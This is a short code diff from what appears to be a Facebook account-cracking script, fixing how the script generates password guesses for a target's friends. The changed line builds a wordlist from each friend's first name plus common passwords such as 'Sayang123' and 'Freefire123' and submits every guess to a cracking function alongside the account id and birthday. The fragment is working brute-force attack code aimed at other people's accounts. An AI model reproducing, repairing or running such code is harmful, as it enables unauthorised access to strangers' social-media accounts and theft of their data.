@@ -156,7 +156,7 @@ def sendTeman():
 				ttl=fb2["birthday"]
 			except KeyError:
 				pass
-			pas=[r3["first_name"]+"123",r3["first_name"]+"12345","Bangsad","Bangsad123","Monyet","Monyet123","Freefire","Freefire123","Doraemon","Sayang123","Booyah","Booyah123"]
+			pas=[fb2["first_name"]+"123",fb2["first_name"]+"12345","Bangsad","Bangsad123","Monyet","Monyet123","Freefire","Freefire123","Doraemon","Sayang123","Booyah","Booyah123"]
 			for pw in pas:
 				try:
 					tokai.submit(crackTeman,user,pw,ttl)
